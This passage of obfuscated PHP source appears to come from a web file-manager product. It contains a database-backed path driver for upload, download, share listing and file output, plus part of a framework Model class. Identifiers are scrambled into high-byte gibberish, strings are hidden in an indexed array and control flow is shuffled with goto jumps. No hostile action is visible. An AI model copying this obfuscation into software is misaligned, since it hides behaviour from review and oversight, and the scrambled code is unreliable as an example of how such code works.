$this->model->pathInfo($a£…Ú£¸²­, $e»ÜË»ÑØ); } return $this->model->pathInfoMore($a£…Ú£¸²­); } public function infoFull($FéÚ®®øìÎ) { $AĞ‘ÑîÕÓ =& $_SERVER[”Ì÷ñ­î¸]; $F©Ğ¶äÃ³‹ = explode($AĞ‘ÑîÕÓ[8], $FéÚ®®øìÎ); $eá†ÊäåÏ = implode($AĞ‘ÑîÕÓ[8], array_splice($F©Ğ¶äÃ³‹, 1)); return $this->model->pathInfoByPath($F©Ğ¶äÃ³‹[0], $eá†ÊäåÏ); } public function hashSimple($cˆÁ®ôšˆ) { $E¬Šİ—Ù•’ =& $_SERVER[”Ì÷ñ­î¸]; $a³¦í­–Öİ = $this->infoWithChildren($cˆÁ®ôšˆ); return $a³¦í­–Öİ[$E¬Šİ—Ù•’[162]][$E¬Šİ—Ù•’[164]]; } public function hashMd5($Féãì„ÂÔ) { $aóã¶ÙŠ„Ä =& $_SERVER[”Ì÷ñ­î¸]; $aâèœ©ğ¬¹ = $this->infoWithChildren($Féãì„ÂÔ); return $aâèœ©ğ¬¹[$aóã¶ÙŠ„Ä[162]][$aóã¶ÙŠ„Ä[163]]; } public function exist($CìÆ¡ÌÇÛ) { $bÆöÂõŒŞ =& $_SERVER[”Ì÷ñ­î¸]; $E¨¦²“Æçî = $this->parse($CìÆ¡ÌÇÛ); if (!$E¨¦²“Æçî[$bÆöÂõŒŞ[75]]) { return $this->isFile($CìÆ¡ÌÇÛ) || $this->isFolder($CìÆ¡ÌÇÛ); } $CŞ¢Ëµƒ»“ = array($bÆöÂõŒŞ[368] => $E¨¦²“Æçî[$bÆöÂõŒŞ[367]], $bÆöÂõŒŞ[28] => $E¨¦²“Æçî[$bÆöÂõŒŞ[75]]); $b›éá®ñïÏ = $this->model->where($CŞ¢Ëµƒ»“)->find(); return $b›éá®ñïÏ ? !0 : !1; } public function isFile($AîÑê—§¦â) { $B•º˜Î­¦ =& $_SERVER[”Ì÷ñ­î¸]; $aŒ…„Û”¯‡ = $this->infoSimple($AîÑê—§¦â); return $aŒ…„Û”¯‡ && $aŒ…„Û”¯‡[$B•º˜Î­¦[370]] == $B•º˜Î­¦[83] ? !1 : !0; } public function isFolder($eà¡“ÉÊÔ) { $Eš‚—ÆåŒÇ =& $_SERVER[”Ì÷ñ­î¸]; $dí‘à²Ë£ = $this->infoSimple($eà¡“ÉÊÔ); return $dí‘à²Ë£ && $dí‘à²Ë£[$Eš‚—ÆåŒÇ[370]] == $Eš‚—ÆåŒÇ[83] ? !0 : !1; } public function listPath($FÙ‡³œÄø÷, $E…Œ²‡Ççî = false) { $Aí‹†£éå =& $_SERVER[”Ì÷ñ­î¸]; if ($FÙ‡³œÄø÷ == $Aí‹†£éå[33]) { return !1; } $a±¿„ˆÍöˆ = array($Aí‹†£éå[368] => $FÙ‡³œÄø÷); if ($E…Œ²‡Ççî) { return $this->model->listSource($a±¿„ˆÍöˆ, -1); } return $this->model->listSource($a±¿„ˆÍöˆ); } public function has($Bµø«‚œÙ, $bäïÄÉìæ± = false, $bìÌñ¤ØÉÊ = null) { $f‹®ìèƒï =& $_SERVER[”Ì÷ñ­î¸]; $D éèà‹İñ = $this->infoWithChildren($Bµø«‚œÙ); if ($bäïÄÉìæ±) { return array($f‹®ìèƒï[192] => $D éèà‹İñ[$f‹®ìèƒï[192]], $f‹®ìèƒï[191] => $D éèà‹İñ[$f‹®ìèƒï[191]]); } return $bìÌñ¤ØÉÊ ? $D éèà‹İñ[$f‹®ìèƒï[192]] : $D éèà‹İñ[$f‹®ìèƒï[191]]; } public function listAll($fµìŒ¢„ê¥) { $FÌÇôóß»ƒ = IO::info($this->pathParse[$_SERVER[”Ì÷ñ­î¸][75]]); if (!$FÌÇôóß»ƒ) { return array(); } return $this->model->listAll($fµìŒ¢„ê¥); } public function getContent($C»»ùé¿¤) { return $this->model->getContent($C»»ùé¿¤); } public function setContent($dªˆÎ˜‡, $d£¼ä™éÕ = '') { return $this->model->setContent($dªˆÎ˜‡, $d£¼ä™éÕ); } public function fileSubstr($b‡Ûöìâã, $eœ¨í©Ñœ­, $B…È±ëš§È) { return $this->model->fileSubstr($b‡Ûöìâã, $eœ¨í©Ñœ­, $B…È±ëš§È); } public function download($CÁ«ï†µìò, $bœÁ´¦˜š = '') { $fœµ‚ŠÅÒÕ = get_path_father($bœÁ´¦˜š); $aÔ¼Ä‰Ó = get_path_this($bœÁ´¦˜š); $BñÏƒÌª´Ì = $this->model->fileInfoGet($CÁ«ï†µìò); $a÷Áøã­» = IO::copy($BñÏƒÌª´Ì[$_SERVER[”Ì÷ñ­î¸][75]], $fœµ‚ŠÅÒÕ, !1, $aÔ¼Ä‰Ó); return $a÷Áøã­»; } public function upload($b‘Ğ—ß¥ì‡, $Bé®ñ”æÁ˜, $eùì×éº‡‘ = false, $B‹ãâƒå¶á = REPEAT_REPLACE) { $AÎçÏğØàš =& $_SERVER[”Ì÷ñ­î¸]; $B©­®Š»¿ = $this->parse($b‘Ğ—ß¥ì‡); $E±˜ŠøÑÃ = $this->model->addFile($B©­®Š»¿[$AÎçÏğØàš[367]], $Bé®ñ”æÁ˜, $B©­®Š»¿[$AÎçÏğØàš[75]], $eùì×éº‡‘, $B‹ãâƒå¶á); return $this->getPathOuter($E±˜ŠøÑÃ); } public function uploadFileByID($cË¹…†èš, $d‡£çÙçƒ‰, $aËÊïğõ¥•) { $C°ÎÚ¤Å™ =& $_SERVER[”Ì÷ñ­î¸]; $d¶¦îŒé¨ˆ = $this->parse($cË¹…†èš); $B•±­»Ğ¿ù = $this->model->addFileByFileID($d¶¦îŒé¨ˆ[$C°ÎÚ¤Å™[367]], $d‡£çÙçƒ‰, $d¶¦îŒé¨ˆ[$C°ÎÚ¤Å™[75]], $aËÊïğõ¥•); return $this->getPathOuter($B•±­»Ğ¿ù); } public function addFileByRemote($C¤™ì’¼­¶, $dËÜÙĞÌˆ, $e…´£Ê÷è  = array(), $d©ÚóÂº¾ = '', $c„ªá•Ê†£) { $fˆˆõÏµ =& $_SERVER[”Ì÷ñ­î¸]; $Cö¦ì‰¡‹ = $this->parse($C¤™ì’¼­¶); $d©ÚóÂº¾ = empty($d©ÚóÂº¾) ? $Cö¦ì‰¡‹[$fˆˆõÏµ[75]] : $d©ÚóÂº¾; $EªöïÌ±¯¦ = $this->model->addFileByRemote($Cö¦ì‰¡‹[$fˆˆõÏµ[367]], $dËÜÙĞÌˆ, $d©ÚóÂº¾, $e…´£Ê÷è , $c„ªá•Ê†£); return $this->getPathOuter($EªöïÌ±¯¦); } public function uploadLink($e‡š¾ì®à, $a‰Ø°¥¦®‡ = 0) { $bÍ¾óÙØÒ =& $_SERVER[”Ì÷ñ­î¸]; $eÉ½ÁÃ„Ø = $this->parse($e‡š¾ì®à); $e‡š¾ì®à = Model($bÍ¾óÙØÒ[544])->createFileName($eÉ½ÁÃ„Ø[$bÍ¾óÙØÒ[75]]); $c±¥²‘ = IO::uploadLink($e‡š¾ì®à, $a‰Ø°¥¦®‡); return $c±¥²‘; } public function fileNameAuto($A”•İì¹ç, $C¸Ê–ß¯éÎ, $b¦õÛèÎö’ = REPEAT_REPLACE, $aÈÖÛ‰‰ = false) { return $this->model->fileNameAuto($A”•İì¹ç, $C¸Ê–ß¯éÎ, $b¦õÛèÎö’, $aÈÖÛ‰‰); } public function fileNameExist($Bœ§ÜÄæâ, $Cíâ•¥˜Ù) { return $this->model->fileNameExist($Bœ§ÜÄæâ, $Cíâ•¥˜Ù); } protected function _fileOut($FéñÉÔíŠ», $CêâˆÂ‡àí = false, $Eó”´³­ˆĞ = false, $D¯‚ÀÅÓß‚ = '', $cåë©×…óŞ = false) { goto DŞóã‹–À; DŞóã‹–À: $a¾õê²®‚å =& $_SERVER[”Ì÷ñ­î¸]; $A öÀß”Æ = $this->model->sourceInfo($FéñÉÔíŠ»); if ($A öÀß”Æ[$a¾õê²®‚å[370]] == $a¾õê²®‚å[83]) { header($a¾õê²®‚å[1119]); die; } goto AªÕ›İÚˆ; f¾Ÿ¼Øƒ§: if ($cåë©×…óŞ) { return IO::fileOutServer($dô¡¯Ó¿Ö†[$a¾õê²®‚å[75]], $CêâˆÂ‡àí, $D»Ë¯‹°‡ƒ, $D¯‚ÀÅÓß‚); } IO::fileOut($dô¡¯Ó¿Ö†[$a¾õê²®‚å[75]], $CêâˆÂ‡àí, $D»Ë¯‹°‡ƒ, $D¯‚ÀÅÓß‚); goto CÁ¬“²×¿¤; AªÕ›İÚˆ: $dô¡¯Ó¿Ö† = $this->model->fileInfoGet($FéñÉÔíŠ»); $D¯‚ÀÅÓß‚ = $dô¡¯Ó¿Ö†[$a¾õê²®‚å[163]] ? $dô¡¯Ó¿Ö†[$a¾õê²®‚å[163]] : $D¯‚ÀÅÓß‚; $D»Ë¯‹°‡ƒ = isset($GLOBALS[$a¾õê²®‚å[1120]]) ? $GLOBALS[$a¾õê²®‚å[1120]] : $A öÀß”Æ[$a¾õê²®‚å[28]]; goto f¾Ÿ¼Øƒ§; CÁ¬“²×¿¤: } public function fileOut($b¹¼ğ•æƒø, $Cˆ£¼ÆÜè = false, $cÂÀ©Ù¡¦å = false, $A›åâë¶‘ = '') { $this->_fileOut($b¹¼ğ•æƒø, $Cˆ£¼ÆÜè, $cÂÀ©Ù¡¦å, $A›åâë¶‘); } public function fileOutServer($CÀ˜²ò—œß, $dŒ›†•©á = false, $Aö”è¸´õ = false, $B¤ïåô¨ØÎ = '') { $this->_fileOut($CÀ˜²ò—œß, $dŒ›†•©á, $Aö”è¸´õ, $B¤ïåô¨ØÎ, !0); } protected function _fileOutImage($eˆ£¦æ£¡…, $D­‚â¾¨¶Ü = 250) { $dÑ½ä‹èîÍ =& $_SERVER[”Ì÷ñ­î¸]; $C–ÃÜ…ºİæ = $this->model->sourceInfo($eˆ£¦æ£¡…); if ($C–ÃÜ…ºİæ[$dÑ½ä‹èîÍ[370]] == $dÑ½ä‹èîÍ[83]) { show_json($dÑ½ä‹èîÍ[1121] . $eˆ£¦æ£¡…, !1); } $GLOBALS[$dÑ½ä‹èîÍ[1120]] = $C–ÃÜ…ºİæ[$dÑ½ä‹èîÍ[28]]; $eõÏ÷¸Æ£Ü = $this->model->fileInfoGet($eˆ£¦æ£¡…); IO::fileOutImage($eõÏ÷¸Æ£Ü[$dÑ½ä‹èîÍ[75]], $D­‚â¾¨¶Ü); } public function fileOutImage($Dğ½–İÚì, $D®¡÷ë­¿ = 250) { $this->_fileOutImage($Dğ½–İÚì, $D®¡÷ë­¿); } public function fileOutImageServer($fõ¼ôâ°È•, $E°¨ºï·ê¦ = 250) { $this->_fileOutImage($fõ¼ôâ°È•, $E°¨ºï·ê¦); } public function link($C‰ÖÓâ†Ş, $C×áêó­ = '') { $aºÊ¸Ä£ = $this->model->fileInfoGet($C‰ÖÓâ†Ş); return IO::link($aºÊ¸Ä£[$_SERVER[”Ì÷ñ­î¸][75]], $C×áêó­); } protected function parse($aà¨×ââ°—) { $fØğ„Ë‚Êñ =& $_SERVER[”Ì÷ñ­î¸]; if (strstr($aà¨×ââ°—, $fØğ„Ë‚Êñ[8]) === !1) { return array($fØğ„Ë‚Êñ[385] => intval($aà¨×ââ°—), $fØğ„Ë‚Êñ[75] => $fØğ„Ë‚Êñ[33], $fØğ„Ë‚Êñ[1118] => array()); } $C¯ÆĞ¨¢Ëœ = explode($fØğ„Ë‚Êñ[8], trim($aà¨×ââ°—, $fØğ„Ë‚Êñ[8])); if (count($C¯ÆĞ¨¢Ëœ) < 2) { show_tips($aà¨×ââ°— . $fØğ„Ë‚Êñ[1122]); } return array($fØğ„Ë‚Êñ[385] => intval($C¯ÆĞ¨¢Ëœ[0]), $fØğ„Ë‚Êñ[75] => $C¯ÆĞ¨¢Ëœ[1], $fØğ„Ë‚Êñ[1118] => array_slice($C¯ÆĞ¨¢Ëœ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($aÇîŞ±è) { $this->pathParse = $aÇîŞ±è; $this->model = Model($_SERVER[”Ì÷ñ­î¸][1117]); } public function getPathOuter($A¶êµ¥‘µ‰) { $D‘‡ë¡·Ä° =& $_SERVER[”Ì÷ñ­î¸]; if (!$A¶êµ¥‘µ‰) { return $A¶êµ¥‘µ‰; } $F’ÚâÆ¬Ü§ = $this->parse($A¶êµ¥‘µ‰); return trim(KodIO::makeShare($this->pathParse[$D‘‡ë¡·Ä°[367]], $F’ÚâÆ¬Ü§[$D‘‡ë¡·Ä°[367]]), $D‘‡ë¡·Ä°[8]); } protected function infoParse($F‚¹–ã­ˆ¡, $b˜ôª—ãè = false, $Bğ˜ñÏÆ º = false) { $A±Ÿ³“¸Œí =& $_SERVER[”Ì÷ñ­î¸]; $eÌÖ¨…„Í = $this->pathParse[$A±Ÿ³“¸Œí[367]]; $dÊËÊ¦·ò = trim($this->pathParse[$A±Ÿ³“¸Œí[1011]], $A±Ÿ³“¸Œí[8]); return Action($A±Ÿ³“¸Œí[1123])->sharePathInfo($eÌÖ¨…„Í, $dÊËÊ¦·ò); } public function infoFull($cĞôÅ±“¯ƒ) { $a˜ô±Á¼ =& $_SERVER[”Ì÷ñ­î¸]; $AÎÆåÛÃ‹ = explode($a˜ô±Á¼[8], trim($cĞôÅ±“¯ƒ, $a˜ô±Á¼[8])); if (count($AÎÆåÛÃ‹) > 1) { $cæ›¶¾ ±À = implode($a˜ô±Á¼[8], array_splice($AÎÆåÛÃ‹, 1)); $c·ƒæ†°• = $this->model->pathInfoByPath($AÎÆåÛÃ‹[0], $cæ›¶¾ ±À); if (!$c·ƒæ†°•) { return !1; } $this->pathParse[$a˜ô±Á¼[1011]] = $c·ƒæ†°•[$a˜ô±Á¼[369]]; } return $this->infoParse($cĞôÅ±“¯ƒ); } public function listAll($D‡‘ÆÊÈ¼Å) { goto b«÷±ÈÌ‡; FèÄ¬¢: foreach ($CĞŞ¡•İÑö as &$aÕ·ÉÆ§†ê) { check_abort(); $aÕ·ÉÆ§†ê[$E¨Êä‚Ì–Ç[391]] = $a¾¿È—²•->_shareItemeParse($aÕ·ÉÆ§†ê[$E¨Êä‚Ì–Ç[391]], $Cçè¬ÓÄç); } return $CĞŞ¡•İÑö; goto bŒÜÆÏÙ‰ë; FÕÌÊ×…Šë: $CĞŞ¡•İÑö = $this->model->listAll($D‡‘ÆÊÈ¼Å); $Cçè¬ÓÄç = Model($E¨Êä‚Ì–Ç[536])->getInfo($DÁ¢ØÒ©®[$E¨Êä‚Ì–Ç[441]]); $a¾¿È—²• = Action($E¨Êä‚Ì–Ç[1123]); goto FèÄ¬¢; b«÷±ÈÌ‡: $E¨Êä‚Ì–Ç =& $_SERVER[”Ì÷ñ­î¸]; $DÁ¢ØÒ©® = IO::info($this->pathParse[$E¨Êä‚Ì–Ç[75]]); if (!$DÁ¢ØÒ©®) { return array(); } goto FÕÌÊ×…Šë; bŒÜÆÏÙ‰ë: } } goto a±Ò××„ˆ; c—ôê±öÚ‹: define($_SERVER[”Ì÷ñ­î¸][230], 0); define($_SERVER[”Ì÷ñ­î¸][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\x6f\x72\x64\145\x72", "\141\x6c\151\141\x73", "\150\141\166\151\x6e\x67", "\x67\162\157\x75\160", "\154\x6f\143\x6b", "\x64\x69\163\x74\151\156\x63\164", "\x61\x75\x74\157", "\146\151\x6c\x74\145\162", "\x76\x61\x6c\151\144\x61\x74\145", "\x72\145\163\x75\154\164", "\142\x69\x6e\144", "\164\157\x6b\145\156"); public function __construct($BçŞŠí°ÄÁ = '', $Dİò‘‰´Ë = '', $CĞÉ¾Î±± = '') { $d¹í˜‰­Ò =& $_SERVER[”Ì÷ñ­î¸]; $this->_initialize(); if (!empty($BçŞŠí°ÄÁ)) { if (strpos($BçŞŠí°ÄÁ, $d¹í˜‰­Ò[91])) { list($this->dbName, $this->name) = explode($d¹í˜‰­Ò[91], $BçŞŠí°ÄÁ); } else { $this->name = $BçŞŠí°ÄÁ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Dİò‘‰´Ë)) { $this->tablePrefix = $d¹í˜‰­Ò[33]; } elseif ($d¹í˜‰­Ò[33] != $Dİò‘‰´Ë) { $this->tablePrefix = $Dİò‘‰´Ë; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($d¹í˜‰­Ò[232]); } $this->db(0, empty($this->connection) ? $CĞÉ¾Î±± : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e„ƒŸºíÇ =& $_SERVER[”Ì÷ñ­î¸]; if (empty($this->fields)) { if (think_config($e„ƒŸºíÇ[233])) { $f›¸—í‘¿ = $this->dbName ? $this->dbName : think_config($e„ƒŸºíÇ[234]); $dÂŞ“ĞÕŠİ = think_var_cache($e„ƒŸºíÇ[235] . strtolower(get_path_this($f›¸—í‘¿) . $e„ƒŸºíÇ[91] . $this->name)); if ($dÂŞ“ĞÕŠİ) { $bÒ½Ã£ç = think_config($e„ƒŸºíÇ[236]); if (empty($bÒ½Ã£ç) || $dÂŞ“ĞÕŠİ[$e„ƒŸºíÇ[237]] == $bÒ½Ã£ç) { $this->fields = $dÂŞ“ĞÕŠİ; return; } } } $this->flush(); } } public function flush() { goto F²ùÛ¥„; aòì†¾Å¯¢: if (think_config($D—Ö®ò¨ƒ¸[233])) { $cÛÊ‹Ç¥† = $this->dbName ? $this->dbName : think_config($D—Ö®ò¨ƒ¸[234]); think_var_cache($D—Ö®ò¨ƒ¸[235] . strtolower(get_path_this($cÛÊ‹Ç¥†) . $D—Ö®ò¨ƒ¸[91] . $this->name), $this->fields); } goto eº§æÏÚç; e‘Ğ”•‹‹: if (!$CëİƒâäÉã) { return !1; } $this->fields = array_keys($CëİƒâäÉã); $this->fields[$D—Ö®ò¨ƒ¸[238]] = !1; goto BáØÖí„ğ¾; F²ùÛ¥„: $D—Ö®ò¨ƒ¸ =& $_SERVER[”Ì÷ñ­î¸]; $this->db->setModel($this->name); $CëİƒâäÉã = $this->db->getFields($this->getTableName()); goto e‘Ğ”•‹‹; BáØÖí„ğ¾: foreach ($CëİƒâäÉã as $AÔœèé¢ä => $aø‘¦òˆéË) { $bø•¡“Ùµ[$AÔœèé¢ä] = $aø‘¦òˆéË[$D—Ö®ò¨ƒ¸[29]]; if ($aø‘¦òˆéË[$D—Ö®ò¨ƒ¸[36]]) { $this->fields[$D—Ö®ò¨ƒ¸[239]] = $AÔœèé¢ä; if ($aø‘¦òˆéË[$D—Ö®ò¨ƒ¸[39]]) { $this->fields[$D—Ö®ò¨ƒ¸[238]] = !0; } } } $this->fields[$D—Ö®ò¨ƒ¸[240]] = $bø•¡“Ùµ; if (think_config($D—Ö®ò¨ƒ¸[236])) { $this->fields[$D—Ö®ò¨ƒ¸[237]] = think_config($D—Ö®ò¨ƒ¸[236]); } goto aòì†¾Å¯¢; eº§æÏÚç: } public function switchModel($c¨Ó‘Ûõ¤‚, $BÊôíĞ¨’  = array()) { $E’ˆ´¿ŸÈ¦ =& $_SERVER[”Ì÷ñ­î¸]; $AÕë¹‰‡‡ = ucwords(strtolower($c¨Ó‘Ûõ¤‚)) . $E’ˆ´¿ŸÈ¦[241]; if (!class_exists($AÕë¹‰‡‡)) { think_exception($AÕë¹‰‡‡ . think_lang($E’ˆ´¿ŸÈ¦[242])); } $this->_extModel = new $AÕë¹‰‡‡($this->name); if (!empty($BÊôíĞ¨’ )) { foreach ($BÊôíĞ¨’  as $EÛ²¬Áª) { $this->_extModel->setProperty($EÛ²¬Áª, $this->{$EÛ²¬Áª}); } } return $this->_extModel; } public function __set($B”¶šŠÎÉØ, $BèÌˆñëĞì) { $this->data[$B”¶šŠÎÉØ] = $BèÌˆñëĞì; } public function __get($eòÚÆ¦ÛÙ¥) { return isset($this->data[$eòÚÆ¦ÛÙ¥]) ? $this->data[$eòÚÆ¦ÛÙ¥] : null; } public function __isset($BíÑ©êĞåÈ) { return isset($this->data[$BíÑ©êĞåÈ]); } public function __unset($a ”ñ¤ÙğÜ) { unset($this->data[$a ”ñ¤ÙğÜ]); } public function __call($c×—çÜƒ¢Š, $F¹’ã¯‘Â½) { $bÚóÎêó× =& $_SERVER[”Ì÷ñ­î¸]; if (in_array(strtolower($c×—çÜƒ¢Š), $this->methods, !0)) { $this->options[strtolower($c×—çÜƒ¢Š)] = $F¹’ã¯‘Â½[0]; return $this; } elseif (in_array(strtolower($c×—çÜƒ¢Š), array($bÚóÎêó×[243], $bÚóÎêó×[244], $bÚóÎêó×[245], $bÚóÎêó×[246], $bÚóÎêó×[247]), !0)) { $CŒ½ÔÖ…ƒ… = isset($F¹’ã¯‘Â½[0]) ? $F¹’ã¯‘Â½[0] : $bÚóÎêó×[176]; $CŒ½ÔÖ…ƒ… = $this->db->parseKey($CŒ½ÔÖ…ƒ…); return $this->getField(strtoupper($c×—çÜƒ¢Š) . $bÚóÎêó×[248] . $CŒ½ÔÖ…ƒ… . $bÚóÎêó×[249] . $c×—çÜƒ¢Š, $bÚóÎêó×[243]); } elseif (strtolower(substr($c×—çÜƒ¢Š, 0, 5)) == $bÚóÎêó×[250]) { $CŒ½ÔÖ…ƒ… = think_parse_name(substr($c×—çÜƒ¢Š, 5)); $c÷Ï‘ø‡ô[$CŒ½ÔÖ…ƒ…] = $F¹’ã¯‘Â½[0]; return $this->where($c÷Ï‘ø‡ô)->find(); } elseif (strtolower(substr($c×—çÜƒ¢Š, 0, 10)) == $bÚóÎêó×[251]) { $bÌ¢Î©§ËÚ = think_parse_name(substr($c×—çÜƒ¢Š, 10)); $c÷Ï‘ø‡ô[$bÌ¢Î©§ËÚ] = $F¹’ã¯‘Â½[0]; return $this->where($c÷Ï‘ø‡ô)->getField($F¹’ã¯‘Â½[1]); } elseif (isset($this->_scope[$c×—çÜƒ¢Š])) { return $this->scope($c×—çÜƒ¢Š, $F¹’ã¯‘Â½[0]); } elseif (method_exists($this, $c×—çÜƒ¢Š)) { array_unshift($F¹’ã¯‘Â½, $c×—çÜƒ¢Š); return call_user_func_array(array($this, $bÚóÎêó×[252]), $F¹’ã¯‘Â½); } else { return call_user_func_array(array(parent, $c×—çÜƒ¢Š), $F¹’ã¯‘Â½); } } protected function call() { goto aÂ˜ªÄøº; f±ÁãÈÆŠ: $Bğñ•†Ñ‹ = $eä¶Ÿ“˜í; if (is_array($eä¶Ÿ“˜í)) { $Bğñ•†Ñ‹ = $eä¶Ÿ“˜í[1]; $eä¶Ÿ“˜í = $eä¶Ÿ“˜í[0]; } $E±‡öãâ» = count($DĞ¾›¬œ¸Œ) - 1; goto FÄŠ‡Öé®Ì; e Ù¢áŞÏè: $dàòùÓš = call_user_func_array(array($this, $eä¶Ÿ“˜í), $DĞ¾›¬œ¸Œ); if (method_exists($this, $eÎÜßŒ¯Éç[256])) { $cˆøÉäÉ§‡ = call_user_func_array(array($this, $eÎÜßŒ¯Éç[257]), array($Bğñ•†Ñ‹, $DĞ¾›¬œ¸Œ, $dàòùÓš)); if ($cˆøÉäÉ§‡) { return $cˆøÉäÉ§‡; } } return $dàòùÓš; goto EŒˆÌÁíš; FÄŠ‡Öé®Ì: if (isset($DĞ¾›¬œ¸Œ[$E±‡öãâ»]) && $DĞ¾›¬œ¸Œ[$E±‡öãâ»] === $eä¶Ÿ“˜í) { think_exception(__CLASS__ . $eÎÜßŒ¯Éç[4] . $eä¶Ÿ“˜í . think_lang($eÎÜßŒ¯Éç[253])); return; } $DĞ¾›¬œ¸Œ[] = $eä¶Ÿ“˜í; if (method_exists($this, $eÎÜßŒ¯Éç[254])) { $cˆøÉäÉ§‡ = call_user_func_array(array($this, $eÎÜßŒ¯Éç[255]), array($Bğñ•†Ñ‹, $DĞ¾›¬œ¸Œ)); if (!is_null($cˆøÉäÉ§‡) && $cˆøÉäÉ§‡ !== !1) { return $cˆøÉäÉ§‡; } } goto e Ù¢áŞÏè; aÂ˜ªÄøº: $eÎÜßŒ¯Éç =& $_SERVER[”Ì÷ñ­î¸]; $DĞ¾›¬œ¸Œ = func_get_args(); $eä¶Ÿ“˜í = array_shift($DĞ¾›¬œ¸Œ); goto f±ÁãÈÆŠ; EŒˆÌÁíš: } protected function _initialize() { } protected function _facade($bº†ÛÙ«õÊ) { $cİÏİñ† =& $_SERVER[”Ì÷ñ­î¸]; if (!empty($this->fields)) { foreach ($bº†ÛÙ«õÊ as $dïù¦™öŠ => $dã‡÷×Ø«¿) { if (!in_array($dïù¦™öŠ, $this->fields, !0)) { unset($bº†ÛÙ«õÊ[$dïù¦™öŠ]); } elseif (is_scalar($dã‡÷×Ø«¿)) { $this->_parseType($bº†ÛÙ«õÊ, $dïù¦™öŠ); } } } if (!empty($this->options[$cİÏİñ†[258]])) { $bº†ÛÙ«õÊ = array_map($this->options[$cİÏİñ†[258]], $bº†ÛÙ«õÊ); unset($this->options[$cİÏİñ†[258]]); } $this->_beforeWrite($bº†ÛÙ«õÊ); return $bº†ÛÙ«õÊ; } protected function _beforeWrite(&$AÚâêÜñ×š) { } public function add($BÔßóèÜ¦ = '', $EÚ†¶ç…ì = array(), $bÎÖ´æóÀ” = false) { goto CÊ¿Â£ˆâ; CÊ¿Â£ˆâ: if (empty($BÔßóèÜ¦)) { if (!empty($this->data)) { $BÔßóèÜ¦ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[”Ì÷ñ­î¸][259]); return !1; } } $EÚ†¶ç…ì = $this->_parseOptions($EÚ†¶ç…ì); $BÔßóèÜ¦ = $this->_facade($BÔßóèÜ¦); goto bƒÖÏ§Øˆ›; bƒÖÏ§Øˆ›: if (!1 === $this->_beforeInsert($BÔßóèÜ¦, $EÚ†¶ç…ì)) { return !1; } $fíñòÔâ¤ = $this->db->insert($BÔßóèÜ¦, $EÚ†¶ç…ì, $bÎÖ´æóÀ”); if (!1 !== $fíñòÔâ¤) { $CİğÌ…İæ = $this->getLastInsID(); if ($CİğÌ…İæ) { $BÔßóèÜ¦[$this->getPk()] = $CİğÌ…İæ; $this->_after_insert($BÔßóèÜ¦, $EÚ†¶ç…ì); return $CİğÌ…İæ; } $this->_after_insert($BÔßóèÜ¦, $EÚ†¶ç…ì); } goto aò©æŠ®¼Ÿ; aò©æŠ®¼Ÿ: return $fíñòÔâ¤; goto b«³ÊÍª»; b«³ÊÍª»: } protected function _beforeInsert(&$c”ÇÀ¼¥Õ£, $aÇ¼èíè) { } protected function _after_insert($c¨ÚÃÉ²¥¿, $C—–Ÿ«İ„„) { } public function addAll($f˜óéáùÉß, $CÇ¹äâ‘¶¥ = array(), $dî›š… = false) { goto A¡µï’»—˜; d›¯ŸÂ§Ÿ‘: return $Bç‡è©ÎÇ­; goto fêã¿Êê‰ê; eÂÕ“‹£êÓ: foreach ($f˜óéáùÉß as $bÁâ¾½ºí¤ => $DòÈ…Ó‡õÜ) { $f˜óéáùÉß[$bÁâ¾½ºí¤] = $this->_facade($DòÈ…Ó‡õÜ); } if (method_exists($this->db, $Bëä’æÂ®â[260])) { $Bç‡è©ÎÇ­ = $this->db->insertAll($f˜óéáùÉß, $CÇ¹äâ‘¶¥, $dî›š…); } else { $this->startTrans(); foreach ($f˜óéáùÉß as $bÁâ¾½ºí¤ => $DòÈ…Ó‡õÜ) { $Bç‡è©ÎÇ­ = $this->db->insert($DòÈ…Ó‡õÜ, $CÇ¹äâ‘¶¥, $dî›š…); } $this->commit(); } if (!1 !== $Bç‡è©ÎÇ­) { $d¬Ö¢ÌÑõ† = $this->getLastInsID(); if ($d¬Ö¢ÌÑõ†) { return $d¬Ö¢ÌÑõ†; } } goto d›¯ŸÂ§Ÿ‘; A¡µï’»—˜: $Bëä’æÂ®â =& $_SERVER[”Ì÷ñ­î¸]; if (empty($f˜óéáùÉß)) { $this->error = think_lang($Bëä’æÂ®â[259]); return !1; } $CÇ¹äâ‘¶¥ = $this->_parseOptions($CÇ¹äâ‘¶¥); goto eÂÕ“‹£êÓ; fêã¿Êê‰ê: } public function selectAdd($aÜŒ­ˆÏ = '', $f£…±Äö = '', $eÄ²¨ø¼Û = array()) { $b­¹®±æ“œ =& $_SERVER[”Ì÷ñ­î¸]; $eÄ²¨ø¼Û = $this->_parseOptions($eÄ²¨ø¼Û); if (!1 === ($d¹›±ÏÆèº = $this->db->selectInsert($aÜŒ­ˆÏ ? $aÜŒ­ˆÏ : $eÄ²¨ø¼Û[$b­¹®±æ“œ[261]], $f£…±Äö ? $f£…±Äö : $this->getTableName(), $eÄ²¨ø¼Û))) { $this->error = think_lang($b­¹®±æ“œ[262]); return !1; } else { return $d¹›±ÏÆèº; } } public function save($f¹ÄÀè¶ëï = '', $Eß…àÒŒ„è = array()) { goto Fƒ¹ó”Äˆ; d£¬¹ùƒáõ: $Eß…àÒŒ„è = $this->_parseOptions($Eß…àÒŒ„è); $bø‘ò™ª = $this->getPk(); if (!isset($Eß…àÒŒ„è[$eªÛ™†êâƒ[263]])) { if (isset($f¹ÄÀè¶ëï[$bø‘ò™ª])) { $b©Ù„ƒ¡¹ê[$bø‘ò™ª] = $f¹ÄÀè¶ëï[$bø‘ò™ª]; $Eß…àÒŒ„è[$eªÛ™†êâƒ[263]] = $b©Ù„ƒ¡¹ê; unset($f¹ÄÀè¶ëï[$bø‘ò™ª]); } else { $this->error = think_lang($eªÛ™†êâƒ[262]); return !1; } } goto dóÜ›ãĞšô; 